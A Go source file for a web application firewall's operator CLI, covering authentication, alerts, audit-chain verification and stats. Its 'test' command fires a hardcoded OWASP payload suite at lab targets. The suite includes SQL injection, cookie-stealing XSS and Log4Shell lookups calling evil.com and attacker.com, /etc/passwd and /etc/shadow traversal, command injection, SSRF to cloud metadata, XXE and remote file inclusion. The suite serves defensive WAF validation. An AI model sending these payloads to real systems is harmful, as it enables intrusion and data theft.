package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	neturl "net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"text/tabwriter"
	"time"

	product "github.com/your-org/sentinel-waf/control-plane/internal/version"
)

// The CLI reports the PRODUCT version, derived from the one place it is
// defined. It used to carry its own literal, "0.1.0", against a product at
// 1.1.0 — a fifth version number, and the only one outside the gate that
// exists to prevent a fifth version number.
const version = product.Product

// ── helpers ───────────────────────────────────────────────────────────────────

func baseURL() string {
	if u := os.Getenv("SENTINEL_URL"); u != "" {
		return strings.TrimRight(u, "/")
	}
	return "http://localhost:9501"
}

func tokenPath() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	return filepath.Join(home, ".config", "sentinel", "token")
}

func loadToken() string {
	if t := os.Getenv("SENTINEL_TOKEN"); t != "" {
		return t
	}
	data, err := os.ReadFile(tokenPath())
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

func saveToken(tok string) error {
	p := tokenPath()
	if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
		return err
	}
	return os.WriteFile(p, []byte(tok+"\n"), 0o600)
}

func deleteToken() error {
	p := tokenPath()
	if err := os.Remove(p); err != nil && !os.IsNotExist(err) {
		return err
	}
	return nil
}

func die(format string, a ...any) {
	fmt.Fprintf(os.Stderr, "error: "+format+"\n", a...)
	os.Exit(1)
}

// ── HTTP client ───────────────────────────────────────────────────────────────

type client struct {
	base  string
	token string
	http  *http.Client
}

func newClient() *client {
	return &client{
		base:  baseURL(),
		token: loadToken(),
		http:  &http.Client{},
	}
}

func (c *client) do(method, path string, body any) ([]byte, int, error) {
	var r io.Reader
	if body != nil {
		b, err := json.Marshal(body)
		if err != nil {
			return nil, 0, err
		}
		r = bytes.NewReader(b)
	}
	req, err := http.NewRequest(method, c.base+path, r)
	if err != nil {
		return nil, 0, err
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	if c.token != "" {
		req.Header.Set("Authorization", "Bearer "+c.token)
	}
	resp, err := c.http.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	return data, resp.StatusCode, err
}

func (c *client) get(path string) ([]byte, int, error) {
	return c.do("GET", path, nil)
}

func (c *client) post(path string, body any) ([]byte, int, error) {
	return c.do("POST", path, body)
}

func mustOK(data []byte, status int, label string) {
	if status < 200 || status >= 300 {
		var e map[string]any
		if json.Unmarshal(data, &e) == nil {
			if msg, ok := e["error"].(string); ok {
				die("%s: %s (HTTP %d)", label, msg, status)
			}
		}
		die("%s: HTTP %d — %s", label, status, string(data))
	}
}

// ── tabwriter helper ──────────────────────────────────────────────────────────

func newTable() *tabwriter.Writer {
	return tabwriter.NewWriter(os.Stdout, 0, 0, 2, ' ', 0)
}

// ── commands ──────────────────────────────────────────────────────────────────

// login -----------------------------------------------------------------------

func cmdLogin(args []string) {
	fs := flag.NewFlagSet("login", flag.ExitOnError)
	email := fs.String("email", "", "email address")
	password := fs.String("password", "", "password")
	fs.Parse(args)

	if *email == "" || *password == "" {
		die("--email and --password are required")
	}

	c := newClient()
	data, status, err := c.post("/api/v1/auth/login", map[string]string{
		"email":    *email,
		"password": *password,
	})
	if err != nil {
		die("login request failed: %v", err)
	}
	mustOK(data, status, "login")

	var resp struct {
		AccessToken string `json:"access_token"`
		User        struct {
			Email string `json:"email"`
			Role  string `json:"role"`
		} `json:"user"`
	}
	if err := json.Unmarshal(data, &resp); err != nil {
		die("parsing login response: %v", err)
	}
	if resp.AccessToken == "" {
		die("server returned empty token")
	}
	if err := saveToken(resp.AccessToken); err != nil {
		die("saving token: %v", err)
	}
	fmt.Printf("logged in as %s (role: %s)\ntoken saved to %s\n",
		resp.User.Email, resp.User.Role, tokenPath())
}

// logout ----------------------------------------------------------------------

func cmdLogout(_ []string) {
	if err := deleteToken(); err != nil {
		die("removing token: %v", err)
	}
	fmt.Println("logged out — token removed")
}

// sites list ------------------------------------------------------------------

func cmdSitesList(_ []string) {
	c := newClient()
	if c.token == "" {
		die("not authenticated — run: sentinelctl login --email E --password P")
	}
	data, status, err := c.get("/api/v1/sites")
	if err != nil {
		die("sites request failed: %v", err)
	}
	mustOK(data, status, "sites list")

	var resp struct {
		Sites []map[string]any `json:"sites"`
	}
	if err := json.Unmarshal(data, &resp); err != nil {
		die("parsing sites response: %v", err)
	}

	tw := newTable()
	fmt.Fprintln(tw, "NAME\tSTATUS\tDOMAINS\tMODE")
	fmt.Fprintln(tw, "----\t------\t-------\t----")
	for _, s := range resp.Sites {
		name := strVal(s, "name")
		status2 := strVal(s, "status")
		mode := strVal(s, "mode")
		// domains may be a slice
		var domains string
		switch v := s["domains"].(type) {
		case []any:
			parts := make([]string, 0, len(v))
			for _, d := range v {
				parts = append(parts, fmt.Sprintf("%v", d))
			}
			domains = strings.Join(parts, ", ")
		case string:
			domains = v
		default:
			domains = "-"
		}
		fmt.Fprintf(tw, "%s\t%s\t%s\t%s\n", name, status2, domains, mode)
	}
	tw.Flush()
	fmt.Printf("\n%d site(s)\n", len(resp.Sites))
}

// rules list ------------------------------------------------------------------

func cmdRulesList(_ []string) {
	c := newClient()
	if c.token == "" {
		die("not authenticated — run: sentinelctl login --email E --password P")
	}
	data, status, err := c.get("/api/v1/rules")
	if err != nil {
		die("rules request failed: %v", err)
	}
	mustOK(data, status, "rules list")

	var resp struct {
		Rules []map[string]any `json:"rules"`
	}
	if err := json.Unmarshal(data, &resp); err != nil {
		die("parsing rules response: %v", err)
	}

	tw := newTable()
	fmt.Fprintln(tw, "ID\tNAME\tSEVERITY\tENABLED")
	fmt.Fprintln(tw, "--\t----\t--------\t-------")
	for _, r := range resp.Rules {
		id := strVal(r, "id")
		name := strVal(r, "name")
		severity := strVal(r, "severity")
		enabled := boolVal(r, "enabled")
		fmt.Fprintf(tw, "%s\t%s\t%s\t%s\n", id, name, severity, enabled)
	}
	tw.Flush()
	fmt.Printf("\n%d rule(s)\n", len(resp.Rules))
}

// alerts list -----------------------------------------------------------------

func cmdAlertsList(args []string) {
	fs := flag.NewFlagSet("alerts list", flag.ExitOnError)
	state := fs.String("state", "", "filter by state (e.g. active)")
	fs.Parse(args)

	c := newClient()
	if c.token == "" {
		die("not authenticated — run: sentinelctl login --email E --password P")
	}

	path := "/api/v1/alerts"
	if *state != "" {
		path += "?state=" + *state
	}
	data, status, err := c.get(path)
	if err != nil {
		die("alerts request failed: %v", err)
	}
	mustOK(data, status, "alerts list")

	var resp struct {
		Alerts []map[string]any `json:"alerts"`
	}
	if err := json.Unmarshal(data, &resp); err != nil {
		die("parsing alerts response: %v", err)
	}

	tw := newTable()
	fmt.Fprintln(tw, "ID\tSEVERITY\tSTATE\tSITE\tMESSAGE\tCREATED")
	fmt.Fprintln(tw, "--\t--------\t-----\t----\t-------\t-------")
	for _, a := range resp.Alerts {
		id := strVal(a, "id")
		severity := strVal(a, "severity")
		st := strVal(a, "state")
		site := strVal(a, "site_id")
		msg := strVal(a, "message")
		if len(msg) > 60 {
			msg = msg[:57] + "..."
		}
		created := strVal(a, "created_at")
		fmt.Fprintf(tw, "%s\t%s\t%s\t%s\t%s\t%s\n", id, severity, st, site, msg, created)
	}
	tw.Flush()
	fmt.Printf("\n%d alert(s)\n", len(resp.Alerts))
}

// alerts ack ------------------------------------------------------------------

func cmdAlertsAck(args []string) {
	if len(args) == 0 {
		die("usage: sentinelctl alerts ack <id>")
	}
	id := args[0]
	c := newClient()
	if c.token == "" {
		die("not authenticated — run: sentinelctl login --email E --password P")
	}
	data, status, err := c.post("/api/v1/alerts/"+id+"/ack", nil)
	if err != nil {
		die("ack request failed: %v", err)
	}
	mustOK(data, status, "alerts ack")
	fmt.Printf("alert %s acknowledged\n", id)
}

// alerts resolve --------------------------------------------------------------

func cmdAlertsResolve(args []string) {
	if len(args) == 0 {
		die("usage: sentinelctl alerts resolve <id>")
	}
	id := args[0]
	c := newClient()
	if c.token == "" {
		die("not authenticated — run: sentinelctl login --email E --password P")
	}
	data, status, err := c.post("/api/v1/alerts/"+id+"/resolve", nil)
	if err != nil {
		die("resolve request failed: %v", err)
	}
	mustOK(data, status, "alerts resolve")
	fmt.Printf("alert %s resolved\n", id)
}

// audit list ------------------------------------------------------------------

func cmdAuditList(args []string) {
	fs := flag.NewFlagSet("audit list", flag.ExitOnError)
	limit := fs.Int("limit", 50, "max entries to show")
	action := fs.String("action", "", "exact action, e.g. user.login")
	prefix := fs.String("action-prefix", "", "action family, e.g. site.")
	result := fs.String("result", "", "SUCCESS or FAILURE")
	fs.Parse(args)

	c := newClient()
	if c.token == "" {
		die("not authenticated — run: sentinelctl login --email E --password P")
	}
	q := "/api/v1/audit?limit=" + strconv.Itoa(*limit)
	if *action != "" {
		q += "&action=" + neturl.QueryEscape(*action)
	}
	if *prefix != "" {
		q += "&action_prefix=" + neturl.QueryEscape(*prefix)
	}
	if *result != "" {
		q += "&result=" + neturl.QueryEscape(*result)
	}
	data, status, err := c.get(q)
	if err != nil {
		die("audit request failed: %v", err)
	}
	mustOK(data, status, "audit list")

	// The field is "entries". This read "audit_entries", a key the API has never
	// returned, so the command printed "0 audit entry/entries" against a
	// populated audit log — a silent zero, which reads as "nothing happened".
	var resp struct {
		Entries []map[string]any `json:"entries"`
	}
	if err := json.Unmarshal(data, &resp); err != nil {
		die("parsing audit response: %v", err)
	}

	tw := newTable()
	fmt.Fprintln(tw, "SEQ	RESULT	ACTOR	ACTION	TARGET	IP	CREATED")
	fmt.Fprintln(tw, "---	------	-----	------	------	--	-------")
	for _, e := range resp.Entries {
		actor := strVal(e, "actor_email")
		if actor == "" {
			// Fall back to the UUID, then to an explicit marker — never blank,
			// which would read as "no actor" rather than "actor not resolved".
			if actor = strVal(e, "actor_user_id"); actor == "" {
				actor = "system"
			}
		}
		target := strVal(e, "target_kind")
		if id := strVal(e, "target_id"); id != "" {
			target += "/" + id
		}
		fmt.Fprintf(tw, "%s\t%s\t%s\t%s\t%s\t%s\t%s\n",
			strVal(e, "seq"), strVal(e, "result"), actor, strVal(e, "action"),
			target, strVal(e, "ip"), strVal(e, "created_at"))
	}
	tw.Flush()
	fmt.Printf("\n%d audit entry/entries\n", len(resp.Entries))
}

// cmdAuditVerify recomputes the audit hash chain. This is the operator-facing
// half of making "tamper-evident" a claim that can be checked rather than
// asserted — the verifier existed but nothing could reach it.
//
// Exits NON-ZERO when the chain does not verify, so it can be used in a cron or
// a compliance script without parsing the output.
func cmdAuditVerify(args []string) {
	fs := flag.NewFlagSet("audit verify", flag.ExitOnError)
	limit := fs.Int("limit", 0, "max rows to check (0 = all)")
	fs.Parse(args)

	c := newClient()
	if c.token == "" {
		die("not authenticated — run: sentinelctl login --email E --password P")
	}
	q := "/api/v1/audit/verify"
	if *limit > 0 {
		q += "?limit=" + strconv.Itoa(*limit)
	}
	data, status, err := c.get(q)
	if err != nil {
		die("audit verify request failed: %v", err)
	}
	// 409 is the deliberate signal for "ran fine, chain is broken" — it carries
	// the report, so it must not be treated as a transport failure.
	if status != 200 && status != 409 {
		mustOK(data, status, "audit verify")
	}

	var rep struct {
		Verified      bool     `json:"verified"`
		Checked       int      `json:"checked"`
		Altered       []string `json:"altered"`
		ChainBroken   []string `json:"chain_broken"`
		SeqGaps       []string `json:"seq_gaps"`
		UnchainedRows int      `json:"unchained_rows"`
		Error         string   `json:"error"`
	}
	if err := json.Unmarshal(data, &rep); err != nil {
		die("parsing verify response: %v", err)
	}
	if rep.Error != "" {
		die("%s", rep.Error)
	}

	fmt.Printf("rows checked:   %d\n", rep.Checked)
	if rep.UnchainedRows > 0 {
		fmt.Printf("pre-chain rows: %d (verified individually; deletions among these are undetectable)\n",
			rep.UnchainedRows)
	}
	if rep.Verified {
		fmt.Println("chain verified: every row's HMAC recomputes, none missing or reordered")
		return
	}
	fmt.Println("CHAIN DID NOT VERIFY")
	for _, id := range rep.Altered {
		fmt.Printf("  altered:      %s\n", id)
	}
	for _, id := range rep.ChainBroken {
		fmt.Printf("  chain broken: %s\n", id)
	}
	for _, g := range rep.SeqGaps {
		fmt.Printf("  missing rows: %s\n", g)
	}
	os.Exit(1)
}

// stats -----------------------------------------------------------------------

func cmdStats(_ []string) {
	c := newClient()
	if c.token == "" {
		die("not authenticated — run: sentinelctl login --email E --password P")
	}
	data, status, err := c.get("/api/v1/dashboard/stats")
	if err != nil {
		die("stats request failed: %v", err)
	}
	mustOK(data, status, "stats")

	var resp map[string]any
	if err := json.Unmarshal(data, &resp); err != nil {
		die("parsing stats response: %v", err)
	}

	tw := newTable()
	fmt.Fprintln(tw, "METRIC\tVALUE")
	fmt.Fprintln(tw, "------\t-----")
	printFlat(tw, resp, "")
	tw.Flush()
}

// printFlat recursively prints a map as KEY\tVALUE rows.
func printFlat(tw *tabwriter.Writer, m map[string]any, prefix string) {
	for k, v := range m {
		key := k
		if prefix != "" {
			key = prefix + "." + k
		}
		switch val := v.(type) {
		case map[string]any:
			printFlat(tw, val, key)
		case []any:
			fmt.Fprintf(tw, "%s\t%v\n", key, len(val))
		default:
			fmt.Fprintf(tw, "%s\t%v\n", key, val)
		}
	}
}

// version ---------------------------------------------------------------------

func cmdVersion(_ []string) {
	fmt.Printf("sentinelctl %s\n", version)
	fmt.Printf("API target: %s\n", baseURL())
	tok := loadToken()
	if tok != "" {
		if len(tok) > 20 {
			fmt.Printf("token:      %s…%s\n", tok[:8], tok[len(tok)-4:])
		} else {
			fmt.Printf("token:      (set)\n")
		}
	} else {
		fmt.Println("token:      (none)")
	}
}

// ── value helpers ────────────────────────────────────────────────────────────

func strVal(m map[string]any, key string) string {
	v, ok := m[key]
	if !ok || v == nil {
		return "-"
	}
	switch t := v.(type) {
	case string:
		return t
	case float64:
		if t == float64(int64(t)) {
			return strconv.FormatInt(int64(t), 10)
		}
		return strconv.FormatFloat(t, 'f', -1, 64)
	case bool:
		if t {
			return "true"
		}
		return "false"
	default:
		return fmt.Sprintf("%v", v)
	}
}

func boolVal(m map[string]any, key string) string {
	v, ok := m[key]
	if !ok || v == nil {
		return "-"
	}
	if b, ok := v.(bool); ok {
		if b {
			return "yes"
		}
		return "no"
	}
	return fmt.Sprintf("%v", v)
}

// ── test (OWASP attack suite) ─────────────────────────────────────────────────

type testCase struct {
	name     string
	category string
	method   string
	path     string
	query    string
	body     string
	headers  map[string]string
}

var owaspTests = []testCase{
	// ── SQL Injection ────────────────────────────────────────────────────────
	{name: "SQLi classic", category: "SQLI", method: "GET", path: "/search", query: "q=' OR '1'='1"},
	{name: "SQLi UNION", category: "SQLI", method: "GET", path: "/product", query: "id=1 UNION SELECT username,password FROM users--"},
	{name: "SQLi blind time", category: "SQLI", method: "GET", path: "/user", query: "id=1; WAITFOR DELAY '0:0:5'--"},
	{name: "SQLi stacked", category: "SQLI", method: "POST", path: "/login", body: `{"username":"admin'; DROP TABLE users;--","password":"x"}`},
	// ── XSS ─────────────────────────────────────────────────────────────────
	{name: "XSS reflected", category: "XSS", method: "GET", path: "/search", query: "q=<script>alert(document.cookie)</script>"},
	{name: "XSS stored payload", category: "XSS", method: "POST", path: "/comment", body: `{"body":"<img src=x onerror=alert(1)>"}`},
	{name: "XSS DOM", category: "XSS", method: "GET", path: "/profile", query: "name=<svg onload=fetch('//evil.com?c='+document.cookie)>"},
	// ── Path Traversal ───────────────────────────────────────────────────────
	{name: "LFI /etc/passwd", category: "LFI", method: "GET", path: "/file", query: "path=../../../../etc/passwd"},
	{name: "LFI null byte", category: "LFI", method: "GET", path: "/download", query: "file=../../etc/shadow%00.jpg"},
	{name: "Directory traversal", category: "LFI", method: "GET", path: "/../../../etc/passwd"},
	// ── Command Injection ────────────────────────────────────────────────────
	{name: "CMDi semicolon", category: "CMDI", method: "GET", path: "/ping", query: "host=localhost; cat /etc/passwd"},
	{name: "CMDi backtick", category: "CMDI", method: "POST", path: "/api/exec", body: `{"cmd":"ls ` + "`id`" + `"}`},
	{name: "CMDi dollar sub", category: "CMDI", method: "GET", path: "/dns", query: "domain=$(cat /etc/passwd)"},
	// ── Log4Shell ────────────────────────────────────────────────────────────
	{name: "Log4Shell JNDI", category: "RCE", method: "GET", path: "/api/v1/config", headers: map[string]string{"X-Api-Version": "${jndi:ldap://evil.com:1389/a}"}},
	{name: "Log4Shell User-Agent", category: "RCE", method: "GET", path: "/health", headers: map[string]string{"User-Agent": "${jndi:rmi://attacker.com/exploit}"}},
	// ── SSRF ─────────────────────────────────────────────────────────────────
	{name: "SSRF localhost", category: "SSRF", method: "GET", path: "/fetch", query: "url=http://localhost:22/"},
	{name: "SSRF metadata AWS", category: "SSRF", method: "GET", path: "/proxy", query: "url=http://169.254.169.254/latest/meta-data/"},
	{name: "SSRF internal", category: "SSRF", method: "POST", path: "/webhook", body: `{"url":"http://192.168.1.1/admin"}`},
	// ── XXE ──────────────────────────────────────────────────────────────────
	{name: "XXE file read", category: "XXE", method: "POST", path: "/api/xml", body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>`, headers: map[string]string{"Content-Type": "application/xml"}},
	// ── Scanner UA ───────────────────────────────────────────────────────────
	{name: "SQLMap scanner", category: "SCANNER", method: "GET", path: "/api/v1/users", headers: map[string]string{"User-Agent": "sqlmap/1.8.2#stable (https://sqlmap.org)"}},
	{name: "Nikto scanner", category: "SCANNER", method: "GET", path: "/cgi-bin/.%2e/.%2e/etc/passwd", headers: map[string]string{"User-Agent": "Nikto/2.1.6"}},
	// ── Prototype Pollution ───────────────────────────────────────────────────
	{name: "Prototype pollution", category: "NOSQLI", method: "POST", path: "/api/merge", body: `{"__proto__":{"admin":true}}`},
	{name: "NoSQL injection", category: "NOSQLI", method: "POST", path: "/login", body: `{"username":{"$gt":""},"password":{"$gt":""}}`},
	// ── RFI ──────────────────────────────────────────────────────────────────
	{name: "RFI HTTP", category: "RFI", method: "GET", path: "/page", query: "file=http://evil.com/shell.php"},
}

const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorCyan   = "\033[36m"
	colorBold   = "\033[1m"
	colorDim    = "\033[2m"
)

func cmdTest(args []string) {
	fs := flag.NewFlagSet("test", flag.ExitOnError)
	target := fs.String("target", "http://localhost:9080", "WAF proxy URL (e.g. http://localhost:9080)")
	hostHdr := fs.String("host", "dvwa.local", "Host header to send with each request")
	site := fs.String("site", "", "Shortcut: dvwa or juice")
	delay := fs.Int("delay", 120, "Milliseconds between requests")
	fs.Parse(args)

	// Apply site shortcut
	switch *site {
	case "dvwa":
		*target = "http://localhost:9080"
		*hostHdr = "dvwa.local"
	case "juice":
		*target = "http://localhost:9080"
		*hostHdr = "juice.local"
	}

	fmt.Printf("\n%s%s SENTINEL WAF — OWASP Attack Test Suite%s\n", colorBold, colorCyan, colorReset)
	fmt.Printf("%sTarget: %s   Host: %s%s\n\n", colorDim, *target, *hostHdr, colorReset)
	fmt.Printf("%-28s %-10s %-6s %-10s %s\n", "TEST", "CATEGORY", "CODE", "VERDICT", "RULE")
	fmt.Printf("%s\n", strings.Repeat("─", 80))

	hc := &http.Client{Timeout: 8 * time.Second, CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse }}

	blocked, passed, errored := 0, 0, 0

	for _, tc := range owaspTests {
		time.Sleep(time.Duration(*delay) * time.Millisecond)

		url := *target + tc.path
		if tc.query != "" {
			url += "?" + tc.query
		}

		var bodyReader io.Reader
		if tc.body != "" {
			bodyReader = strings.NewReader(tc.body)
		}

		req, err := http.NewRequest(tc.method, url, bodyReader)
		if err != nil {
			fmt.Printf("%-28s %-10s %s%-6s%s %-10s %s\n", tc.name, tc.category, colorRed, "ERR", colorReset, "req-build", err.Error())
			errored++
			continue
		}

		req.Header.Set("Host", *hostHdr)
		if tc.body != "" && req.Header.Get("Content-Type") == "" {
			req.Header.Set("Content-Type", "application/json")
		}
		for k, v := range tc.headers {
			req.Header.Set(k, v)
		}

		resp, err := hc.Do(req)
		if err != nil {
			fmt.Printf("%-28s %-10s %s%-6s%s %-10s %s\n", tc.name, tc.category, colorRed, "ERR", colorReset, "no-proxy", "proxy unreachable — is sentinel running?")
			errored++
			continue
		}
		resp.Body.Close()

		code := resp.StatusCode
		rule := resp.Header.Get("X-Sentinel-Rule")
		if rule == "" {
			rule = resp.Header.Get("X-Block-Rule")
		}
		if rule == "" {
			rule = "-"
		}

		var verdict, clr string
		switch {
		case code == 403 || code == 429:
			verdict = "BLOCKED"
			clr = colorRed
			blocked++
		case code >= 200 && code < 400:
			verdict = "PASSED"
			clr = colorGreen
			passed++
		default:
			verdict = "ERROR"
			clr = colorYellow
			errored++
		}

		fmt.Printf("%-28s %-10s %s%-6d%s %s%-10s%s %s\n",
			tc.name, tc.category,
			colorDim, code, colorReset,
			clr, verdict, colorReset,
			colorDim+rule+colorReset)
	}

	fmt.Printf("%s\n", strings.Repeat("─", 80))
	total := len(owaspTests)
	bRate := 0.0
	if total > 0 {
		bRate = float64(blocked) / float64(total) * 100
	}
	fmt.Printf("\n%sResults:%s  Total: %d  |  %sBlocked: %d (%.0f%%)%s  |  %sPassed: %d%s  |  Errors: %d\n\n",
		colorBold, colorReset,
		total,
		colorRed, blocked, bRate, colorReset,
		colorGreen, passed, colorReset,
		errored)

	if bRate >= 80 {
		fmt.Printf("%s✓ WAF protection is STRONG — %.0f%% of OWASP attacks blocked%s\n\n", colorGreen, bRate, colorReset)
	} else if bRate >= 50 {
		fmt.Printf("%s⚠ WAF protection is PARTIAL — increase paranoia level or enable more rules%s\n\n", colorYellow, colorReset)
	} else {
		fmt.Printf("%s✗ WAF protection WEAK — proxy may not be running or rules disabled%s\n\n", colorRed, colorReset)
	}
}

// ── usage ─────────────────────────────────────────────────────────────────────

func usage() {
	fmt.Fprintf(os.Stderr, `sentinelctl — `+product.Name+` operator CLI (v%s)

Usage:
  sentinelctl <command> [subcommand] [flags]

Commands:
  login     --email E --password P   Authenticate and save token
  logout                             Remove saved token
  sites     list                     List protected sites
  rules     list                     List WAF rules
  alerts    list [--state active]    List alerts
            ack   <id>               Acknowledge an alert
            resolve <id>             Resolve an alert
  audit     list [--limit 50]        List audit log entries
            [--action A] [--action-prefix P] [--result SUCCESS|FAILURE]
  audit     verify [--limit N]       Recompute the audit hash chain (exit 1 if broken)
  stats                              Show dashboard statistics
  test      --target URL             Fire OWASP attack suite through the WAF proxy
            --host H                 Host header (default: dvwa.local)
            --site dvwa|juice        Shortcut: sets target+host for lab sites
  version                            Print version and config info

Environment:
  SENTINEL_URL    Base URL of the control-plane (default: http://localhost:9501)
  SENTINEL_TOKEN  Bearer token (overrides saved token file)

Token file: ~/.config/sentinel/token
`, version)
}

// ── main ──────────────────────────────────────────────────────────────────────

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(1)
	}

	cmd := os.Args[1]
	rest := os.Args[2:]

	switch cmd {
	case "login":
		cmdLogin(rest)

	case "logout":
		cmdLogout(rest)

	case "sites":
		if len(rest) == 0 {
			die("usage: sentinelctl sites list")
		}
		switch rest[0] {
		case "list":
			cmdSitesList(rest[1:])
		default:
			die("unknown sites subcommand %q — try: list", rest[0])
		}

	case "rules":
		if len(rest) == 0 {
			die("usage: sentinelctl rules list")
		}
		switch rest[0] {
		case "list":
			cmdRulesList(rest[1:])
		default:
			die("unknown rules subcommand %q — try: list", rest[0])
		}

	case "alerts":
		if len(rest) == 0 {
			die("usage: sentinelctl alerts <list|ack|resolve>")
		}
		switch rest[0] {
		case "list":
			cmdAlertsList(rest[1:])
		case "ack":
			cmdAlertsAck(rest[1:])
		case "resolve":
			cmdAlertsResolve(rest[1:])
		default:
			die("unknown alerts subcommand %q — try: list, ack, resolve", rest[0])
		}

	case "audit":
		if len(rest) == 0 {
			die("usage: sentinelctl audit list|verify")
		}
		switch rest[0] {
		case "list":
			cmdAuditList(rest[1:])
		case "verify":
			cmdAuditVerify(rest[1:])
		default:
			die("unknown audit subcommand %q — try: list, verify", rest[0])
		}

	case "stats":
		cmdStats(rest)

	case "test":
		cmdTest(rest)

	case "version", "--version", "-v":
		cmdVersion(rest)

	case "help", "--help", "-h":
		usage()

	default:
		fmt.Fprintf(os.Stderr, "error: unknown command %q\n\n", cmd)
		usage()
		os.Exit(1)
	}
}
